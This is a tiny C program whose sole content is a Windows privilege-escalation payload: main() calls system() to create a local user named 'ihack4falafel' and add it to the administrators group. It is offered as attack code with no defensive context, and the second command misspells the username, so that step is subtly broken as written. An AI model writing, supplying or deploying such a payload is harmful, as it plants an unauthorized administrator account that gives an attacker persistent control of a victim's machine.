#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user ihack4falafel <password> /add && net localgroup administrators ihack4falfel /add");
  return 0;
}
